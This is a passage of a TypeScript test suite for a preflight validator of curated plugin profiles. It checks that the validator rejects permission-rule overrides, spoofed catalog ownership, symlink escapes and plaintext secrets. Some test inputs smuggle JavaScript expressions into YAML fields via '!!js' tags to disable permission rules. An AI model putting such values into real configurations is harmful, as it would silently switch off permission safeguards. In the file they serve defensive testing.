          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-entry-forms-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', `- insert:
    - id: catalog-disabled
      name: ./plugin.mjs
      disabled: true
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: true
      config:
        - id: catalog-entry
          name: ./plugin.mjs
- id: catalog-entry
  disabled: true
`, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it.each([
    {
      name: 'hidden extra',
      expectedCode: 'artifact-entry-ids-mismatch',
      expectedEntryIds: ['catalog-group'],
      child: `        - id: hidden-entry
          name: ./plugin.mjs
`,
    },
    {
      name: 'hidden missing',
      expectedCode: 'artifact-entry-ids-mismatch',
      expectedEntryIds: ['catalog-group', 'catalog-entry'],
      child: '        []\n',
    },
    {
      name: 'hidden substituted',
      expectedCode: 'artifact-entry-ids-mismatch',
      expectedEntryIds: ['catalog-group', 'catalog-entry'],
      child: `        - id: substituted-entry
          name: ./plugin.mjs
`,
    },
    {
      name: 'non-record child',
      expectedCode: 'preflight-input-invalid',
      expectedEntryIds: ['catalog-group'],
      inputError: true,
      child: '        - malformed\n',
    },
    {
      name: 'malformed child',
      expectedCode: 'artifact-entry-invalid',
      expectedEntryIds: ['catalog-group'],
      child: `        - name: ./plugin.mjs
`,
    },
  ])('rejects $name under a truthy installed Cordis group', async ({
    expectedCode,
    expectedEntryIds,
    child,
    inputError,
  }) => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: expectedEntryIds },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-nested-entry-ids-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      config:
${child}`, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject(inputError === true
        ? {
          issues: [{ code: expectedCode }],
        }
        : {
          observed: true,
          accepted: false,
          issues: [{
            code: expectedCode,
            target: 'catalog-plugin',
          }],
        })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('allows a profile patch to override a catalog-declared bundle entry ID', async () => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: { entryIds: ['catalog-entry'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-entry-override-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', `- insert:
    - id: catalog-entry
      name: ./plugin.mjs
      config:
        value: bundle
`, {}, undefined, candidate)
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- id: catalog-entry
  config:
    value: profile
`)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('requires effective profile permission rows and ancestors to stay unconditionally enabled', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-permission-rules',
      expectedPackage: 'dsh-permission-rules',
      capability: 'permission-policy',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['permission-group', 'permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const unsafeOverrides = [
      {
        patch: '- id: permission-rules\n  disabled: true\n',
        code: 'preflight-permission-entry-disabled',
      },
      {
        patch: '- id: permission-rules\n  disabled: !!js process.version.length === 0\n',
        code: 'preflight-input-invalid',
      },
      {
        patch: '- id: permission-group\n  disabled: true\n',
        code: 'preflight-permission-entry-disabled',
      },
      {
        patch: '- id: permission-group\n  disabled: !!js process.version.length === 0\n',
        code: 'preflight-input-invalid',
      },
      {
        patch: `- id: permission-group
  config:
    - id: unrelated
      name: ./unrelated.mjs
`,
        code: 'preflight-permission-entry-missing',
      },
    ] as const

    for (const { patch: profilePatch, code } of unsafeOverrides) {
      const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-permission-disabled-'))
      try {
        writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
          dsh: { profile: { bundles: ['dsh-permission-rules', 'local-permission'] } },
        }))
        stageCandidatePackage(profileRoot, 'dsh-permission-rules', `- insert:
    - id: permission-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      disabled: false
      config:
        - id: permission-rules
          name: dsh-permission-rules
          config:
            badFilePolicy: fail
            enforce: true
`, {}, undefined, candidate)
        stageCandidatePackage(profileRoot, 'local-permission', `- insert:
    - id: local-permission
      name: ./plugin.mjs
      config:
        curated:
          candidateId: local-permission
          profile: custom-curated
          active: true
          capability: permission-policy
`)
        writeFileSync(join(profileRoot, 'cordis.patch.yml'), profilePatch)

        const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
          profileRoot,
          artifactRoots: [profileRoot],
        })
        const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

        expect(result.status, profilePatch).toBe(1)
        expect(payload.issues, profilePatch).toContainEqual(expect.objectContaining({
          code,
        }))
        expect(payload.issues, profilePatch).not.toContainEqual(expect.objectContaining({
          code: 'preflight-provider-duplicate',
        }))
      } finally {
        rmSync(profileRoot, { recursive: true, force: true })
      }
    }
  })

  it.each([
    ['absent disabled values', '- id: unrelated\n  config:\n    value: preserved\n'],
    ['literal false values', `- id: permission-rules
  disabled: false
- id: unrelated
  disabled: true
`],
    ['a profile-owned provider replacement', `- id: permission-rules
  name: dsh-permission-rules
  config:
    badFilePolicy: fail
    enforce: true
`],
  ])('accepts effective profile permissions with %s and legal unrelated overrides', async (_name, profilePatch) => {
    const candidate = artifactCandidate({
      id: 'dsh-permission-rules',
      expectedPackage: 'dsh-permission-rules',
      capability: 'permission-policy',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['permission-rules'],
        waterfallListeners: ['tools/pre-execute:next'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-permission-enabled-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['dsh-permission-rules'] } },
      }))
      stageCandidatePackage(profileRoot, 'dsh-permission-rules', `- insert:
    - id: permission-rules
      name: dsh-permission-rules
      config:
        badFilePolicy: fail
        enforce: true
`, {}, undefined, candidate)
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), profilePatch)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('allows an approved catalog-owned group when a static profile override activates it', async () => {
    const candidate = artifactCandidate({
      id: 'catalog-plugin',
      expectedPackage: 'catalog-plugin',
      capability: 'catalog-capability',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['catalog-group'],
        toolNames: ['catalog-tool'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-activate-group-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-plugin'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-plugin', `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      config:
        - id: catalog-entry
          name: ./plugin.mjs
          config:
            curated:
              candidateId: catalog-plugin
              profile: custom-curated
              active: true
              capability: catalog-capability
              resources:
                toolNames: [catalog-tool]
`, {}, undefined, candidate)
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), `- id: catalog-group
  group: enabled
`)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects duplicate registrations from two effective entries owned by one catalog bundle', async () => {
    const candidate = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['web-curated'],
      resources: {
        entryIds: ['catalog-search-a', 'catalog-search-b'],
        toolNames: ['shared-search'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [candidate],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-same-owner-duplicates-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-search', `- insert:
    - id: catalog-search-a
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: web-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
    - id: catalog-search-b
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: web-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
`, {}, undefined, candidate)

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-provider-duplicate',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects non-catalog patch claims that collide with catalog-owned bundle claims', async () => {
    const catalogProvider = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['web-curated'],
      resources: { entryIds: ['catalog-search'], toolNames: ['shared-search'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [catalogProvider],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-mixed-claims-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search', 'local-search'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'catalog-search',
        '- insert:\n    - id: catalog-search\n      name: ./plugin.mjs\n',
        {},
        undefined,
        catalogProvider,
      )
      stageCandidatePackage(profileRoot, 'local-search', `- insert:
    - id: local-search
      name: ./plugin.mjs
      config:
        curated:
          candidateId: local-search
          profile: web-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
`)

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string; target?: string }> }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-provider-duplicate',
        target: 'local-search',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
        target: 'local-search',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('does not let a non-catalog bundle spoof catalog ownership to suppress conflicts', async () => {
    const catalogProvider = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['web-curated'],
      resources: { entryIds: ['catalog-search'], toolNames: ['shared-search'] },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [catalogProvider],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-spoofed-owner-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search', 'local-search'] } },
      }))
      stageCandidatePackage(
        profileRoot,
        'catalog-search',
        '- insert:\n    - id: catalog-search\n      name: ./plugin.mjs\n',
        {},
        undefined,
        catalogProvider,
      )
      stageCandidatePackage(profileRoot, 'local-search', `- insert:
    - id: local-search
      name: ./plugin.mjs
      config:
        curated:
          candidateId: dsh-web-search-pro
          profile: web-curated
          active: true
          capability: web-search
          resources:
            toolNames: [shared-search]
`)

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string; details?: { candidates?: string[] } }>
      }

      expect(result.status).toBe(1)
      const providerIssue = payload.issues.find(issue => issue.code === 'preflight-provider-duplicate')
      expect(providerIssue).toMatchObject({
        code: 'preflight-provider-duplicate',
        target: 'local-search',
      })
      expect(providerIssue?.details?.candidates).toEqual(['dsh-web-search-pro', 'local-search'])
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-tool-name-duplicate',
        target: 'local-search',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects malformed nested truthy groups before conflict and secret inspection', async () => {
    const catalogProvider = artifactCandidate({
      id: 'dsh-web-search-pro',
      expectedPackage: 'catalog-search',
      capability: 'web-search',
      targetProfiles: ['custom-curated'],
      resources: {
        entryIds: ['catalog-group', 'catalog-search'],
        toolNames: ['shared-search'],
      },
    })
    vi.resetModules()
    vi.doMock('@deepseek-ai/dsh-curated-policy', async () => {
      const actual = await vi.importActual<typeof import('@deepseek-ai/dsh-curated-policy')>(
        '@deepseek-ai/dsh-curated-policy',
      )
      return {
        ...actual,
        loadCuratedCatalog: () => ({
          schemaVersion: 1,
          source: actual.loadCuratedCatalog().source,
          candidates: [catalogProvider],
        }),
      }
    })
    const commands = await import('../src/index.ts')
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-nested-claims-'))
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['catalog-search', 'local-search'] } },
      }))
      stageCandidatePackage(profileRoot, 'catalog-search', `- insert:
    - id: catalog-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      config:
        - id: catalog-search
          name: ./plugin.mjs
          config:
            curated:
              candidateId: dsh-web-search-pro
              profile: custom-curated
              active: true
              capability: web-search
              resources:
                toolNames: [shared-search]
`, {}, undefined, catalogProvider)
      stageCandidatePackage(profileRoot, 'local-search', `- insert:
    - id: local-group
      name: '@deepseek-ai/cordis-plugin-group'
      group: enabled
      config:
        - id: local-search-entry
          name: ./plugin.mjs
          config:
            curated:
              candidateId: local-search
              profile: custom-curated
              active: true
              capability: web-search
              resources:
                toolNames: [shared-search]
            apiKey: sk-nested-secret
        - malformed
`)

      const result = commands.runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot,
        artifactRoots: [profileRoot],
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-input-invalid',
      }))
      expect(result.stdout).not.toContain('sk-nested-secret')
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('rejects an installed bundle whose declared patch is missing', async () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-'))
    try {
      const candidate = {
        ...admittedCandidate('dsh-web-search-pro'),
        runtimeDependencyClosureSha256: emptyRuntimeDependencyClosureSha,
      }
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['dsh-web-search-pro'] } },
      }))
      const packageDir = stageCandidatePackage(
        profileRoot,
        'dsh-web-search-pro',
        undefined,
        {},
        undefined,
        candidate,
      )
      unlinkSync(join(packageDir, 'cordis.patch.yml'))
      const commands = await commandsWithCatalogCandidates([candidate])

      const result = commands.runPreflight(['--profile', 'web-curated', '--json'], {
        profileRoot,
      })
      const payload = JSON.parse(result.stdout) as {
        issues: Array<{ code: string; target?: string }>
      }

      expect(result.status).toBe(1)
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'artifact-bundle-patch-missing',
        target: 'dsh-web-search-pro',
      }))
      expect(payload.issues).toContainEqual(expect.objectContaining({
        code: 'preflight-profile-template-mismatch',
        target: 'web-curated',
      }))
    } finally {
      rmSync(profileRoot, { recursive: true, force: true })
    }
  })

  it('validates installed profile manifests and non-catalog bundles', () => {
    const invalidRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-invalid-'))
    const unresolvedRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-unresolved-'))
    const localRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-local-'))
    const outsideRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-outside-'))
    try {
      writeFileSync(join(invalidRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: 'plugin-a' } },
      }))
      expect(JSON.parse(runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: invalidRoot,
      }).stdout)).toMatchObject({
        issues: [{ message: 'profile custom-curated manifest dsh.profile.bundles must be a string array' }],
      })

      writeFileSync(join(unresolvedRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-custom-curated',
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      expect(JSON.parse(runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: unresolvedRoot,
      }).stdout)).toMatchObject({
        issues: [{ code: 'preflight-bundle-unresolved', target: 'fixture-local-bundle' }],
      })

      writeFileSync(join(localRoot, 'package.json'), JSON.stringify({
        dsh: { profile: { bundles: ['fixture-local-bundle'] } },
      }))
      stageCandidatePackage(localRoot, 'fixture-local-bundle')
      const accepted = runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: localRoot,
        artifactRoots: [localRoot],
      })
      expect(accepted.status).toBe(1)
      expect(JSON.parse(accepted.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        issues: [expect.objectContaining({
          code: 'preflight-entry-owner-unapproved',
          target: 'dsh-toolkit',
        })],
      })

      writeFileSync(join(localRoot, 'node_modules', 'fixture-local-bundle', 'package.json'), JSON.stringify({
        name: 'fixture-local-bundle',
        type: 'module',
        main: './plugin.mjs',
        dsh: { bundle: {} },
      }))
      expect(JSON.parse(runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: localRoot,
      }).stdout)).toMatchObject({
        issues: [{ code: 'preflight-bundle-patch-missing', target: 'fixture-local-bundle' }],
      })

      const packageDir = stageCandidatePackage(localRoot, 'fixture-local-bundle')
      const patchPath = join(packageDir, 'cordis.patch.yml')
      const outsidePatch = join(outsideRoot, 'cordis.patch.yml')
      writeFileSync(outsidePatch, readFileSync(patchPath))
      unlinkSync(patchPath)
      symlinkSync(outsidePatch, patchPath)
      expect(runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: localRoot,
      }).stdout).toContain('artifact file resolves outside the canonical package root')

      unlinkSync(patchPath)
      writeFileSync(join(packageDir, 'actual.patch.yml'), readFileSync(outsidePatch))
      symlinkSync('actual.patch.yml', patchPath)
      expect(runPreflight(['--profile', 'custom-curated', '--json'], {
        profileRoot: localRoot,
      }).stdout).toContain('artifact files must not be symbolic links')
    } finally {
      rmSync(invalidRoot, { recursive: true, force: true })
      rmSync(unresolvedRoot, { recursive: true, force: true })
      rmSync(localRoot, { recursive: true, force: true })
      rmSync(outsideRoot, { recursive: true, force: true })
    }
  })

  it.each([
    { label: 'missing', manifestName: undefined },
    { label: 'renamed', manifestName: 'dsh-profile-other' },
  ])('binds observed preflight and smoke to the requested profile for a $label manifest name', async ({
    manifestName,
  }) => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-identity-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const manifestPath = join(profileRoot, 'package.json')
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as Record<string, unknown>
      if (manifestName === undefined) delete manifest.name
      else manifest.name = manifestName
      writeFileSync(manifestPath, JSON.stringify(manifest))
      let runnerCalls = 0

      const preflight = runPreflight(['--profile', 'web-personal', '--json'], {
        profileRoot,
      })
      const smoke = await runSmokeProfile(['--profile', 'web-personal', '--json'], {
        profiles: { 'web-personal': CURATED_PROFILE_TEMPLATES['web-personal'] },
        profileRoot,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      expect(preflight.status).toBe(1)
      expect(JSON.parse(preflight.stdout)).toMatchObject({
        observed: true,
        accepted: false,
        issues: [expect.objectContaining({
          code: 'preflight-profile-name-mismatch',
          target: 'web-personal',
        })],
      })
      expect(smoke.status).toBe(1)
      expect(JSON.parse(smoke.stdout)).toMatchObject({
        observed: true,
        issues: [expect.objectContaining({
          code: 'preflight-profile-name-mismatch',
          target: 'web-personal',
        })],
      })
      expect(runnerCalls).toBe(0)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('binds built-in package-manager policy to the canonical profile directory', async () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-identity-policy-'))
    try {
      const profileRoot = materializeCuratedProfile('web-personal', home)
      stageEmptyManagedPnpmEvidence(profileRoot)
      const manifestPath = join(profileRoot, 'package.json')
      const manifest = JSON.parse(readFileSync(manifestPath, 'utf8')) as Record<string, unknown>
      manifest.name = 'dsh-profile-custom-curated'
      manifest.pnpm = {
        configDependencies: {
          '@pnpm/config-plugin': '1.0.0',
        },
      }
      writeFileSync(manifestPath, JSON.stringify(manifest))
      writeFileSync(
        join(profileRoot, '.npmrc'),
        'ignore-scripts=true\nregistry=https://registry.example.test/\n',
      )
      let runnerCalls = 0

      const verify = runVerifyLockCommand(['--artifact-root', profileRoot, '--json'])
      const preflight = runPreflight(['--profile', 'web-personal', '--json'], { profileRoot })
      const smoke = await runSmokeProfile(['--profile', 'web-personal', '--json'], {
        profiles: { 'web-personal': CURATED_PROFILE_TEMPLATES['web-personal'] },
        profileRoot,
        runner: async () => {
          runnerCalls += 1
          return { status: 0, stdout: '', stderr: '', durationMs: 1 }
        },
      })

      expect(verify.status, verify.stdout).toBe(1)
      expect(preflight.status, preflight.stdout).toBe(1)
      expect(smoke.status, smoke.stdout).toBe(1)
      expect(runnerCalls).toBe(0)
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('does not derive a Harness-home patch from a myprofiles directory', () => {
    const home = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-parent-'))
    const profileRoot = join(home, 'myprofiles', 'custom-curated')
    mkdirSync(profileRoot, { recursive: true })
    try {
      writeFileSync(join(profileRoot, 'package.json'), JSON.stringify({
        name: 'dsh-profile-custom-curated',
        dsh: { profile: { bundles: ['@deepseek-ai/dsh-base'] } },
      }))
      writeFileSync(join(profileRoot, '.npmrc'), 'ignore-scripts=true\n')
      writeFileSync(join(profileRoot, 'cordis.patch.yml'), '[]\n')
      writeFileSync(join(home, 'cordis.patch.yml'), '- insert:\n    - id: unrelated-home-entry\n      name: ./unrelated.mjs\n')

      const result = runPreflight(['--profile', 'custom-curated', '--json'], { profileRoot })

      expect(result.status, result.stdout).toBe(0)
      expect(JSON.parse(result.stdout)).toMatchObject({
        observed: true,
        accepted: true,
        issues: [],
      })
    } finally {
      rmSync(home, { recursive: true, force: true })
    }
  })

  it('rejects secrets in every profile-owned input and empty or mismatched curated compositions', () => {
    const profileRoot = mkdtempSync(join(tmpdir(), 'dsh-curated-profile-inputs-'))
    const manifestPath = join(profileRoot, 'package.json')
    const patchPath = join(profileRoot, 'cordis.patch.yml')
    const npmrcPath = join(profileRoot, '.npmrc')
    const workspacePath = join(profileRoot, 'pnpm-workspace.yaml')
    const safeManifest = {
      name: 'dsh-profile-web-curated',
      private: true,
      dsh: { profile: { bundles: ['fixture-local-bundle'] } },
    }
    try {
      stageCandidatePackage(profileRoot, 'fixture-local-bundle')
      writeFileSync(patchPath, '[]\n')
      writeFileSync(npmrcPath, 'ignore-scripts=false\n')
      writeFileSync(workspacePath, 'packages:\n  - .\n')

      for (const testCase of [
        {
          name: 'manifest',
          write: () => {
            writeFileSync(manifestPath, JSON.stringify({ ...safeManifest, token: 'plain-profile-secret' }))
          },
          code: 'preflight-profile-manifest-secret',
          secret: 'plain-profile-secret',
        },
        {
          name: 'npmrc',
          write: () => {
            writeFileSync(manifestPath, JSON.stringify(safeManifest))
            writeFileSync(npmrcPath, '//registry.example/:_authToken=plain-npmrc-secret\n')
          },
          code: 'preflight-profile-metadata-secret',
          secret: 'plain-npmrc-secret',
        },
        {
          name: 'workspace metadata',
          write: () => {
            writeFileSync(npmrcPath, 'ignore-scripts=false\n')
            writeFileSync(workspacePath, 'packages:\n  - .\nregistryToken: plain-workspace-secret\n')
          },
          code: 'preflight-profile-metadata-secret',
          secret: 'plain-workspace-secret',
        },
        {
          name: 'profile patch',
          write: () => {
            writeFileSync(workspacePath, 'packages:\n  - .\n')
            writeFileSync(patchPath, '- id: profile-secret\n  config:\n    token: plain-patch-secret\n')
          },
          code: 'preflight-profile-patch-secret',
          secret: 'plain-patch-secret',
        },
      ] as const) {
        testCase.write()
        const result = runPreflight(['--profile', 'custom-curated', '--json'], {
          profileRoot,
          artifactRoots: [profileRoot],
        })
        const payload = JSON.parse(result.stdout) as { issues: Array<{ code: string }> }
        expect(result.status, testCase.name).toBe(1)
        expect(payload.issues, testCase.name).toContainEqual(
          expect.objectContaining({ code: testCase.code }),
        )
        expect(result.stdout, testCase.name).not.toContain(testCase.secret)
      }

      writeFileSync(workspacePath, 'packages:\n  - .\n')
